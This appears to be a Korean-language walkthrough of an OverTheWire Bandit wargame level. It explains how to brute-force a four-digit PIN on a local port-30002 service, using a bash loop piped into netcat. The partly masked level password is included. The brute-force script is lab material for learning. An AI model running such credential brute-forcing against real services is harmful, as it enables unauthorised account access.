# Category

linux

# Overview

30002포트에 프로세스가 실행중이고 `bandit24` 비밀번호와 4자리 숫자 핀코드를 제출하면 `bandit25` 비밀번호를 얻을 수 있다.
핀코드는 브루트포스라고 불리는 10000가지의 모든 조합을 통해서 얻는 방법 밖에 없다.
매번 새로운 연결을 생성할 필요가 없다.

# Analysis

nc를 통해 30002포트에 접속한 후 문제에서 제시된 것과 같이 `bandit24` 비밀번호와 4자리 임의 핀코드를 입력한 결과 비빌번호가 틀렸다는 응답이 오게되며 다음 입력을 받을 대기상태에 있는 것을 확인했다.

# Exploitation

0~9999까지의 요청을 보내는 스크립트를 만들어 30002포트에 접속해 전송하면 일치하는 비밀번호를 찾을 수 있을 것으로 보임.

```bash
#!/bin/bash

for i in {0..9999}
do
  echo "gb...G8 $(printf "%04d" $i)"
done
```

위와 같이 9999까지의 현재 비밀번호를 출력하는 스크립트를 만들고 nc 연결에 입력으로 보내 나온 출력값을 임시폴더에 결과값을 저장하는 요청 시 다음 비밀번호를 획득할 수 있다.

```bash
bash solve.sh | nc localhost 30002 > /tmp/tmp.ja548kqoSB/result.txt
```
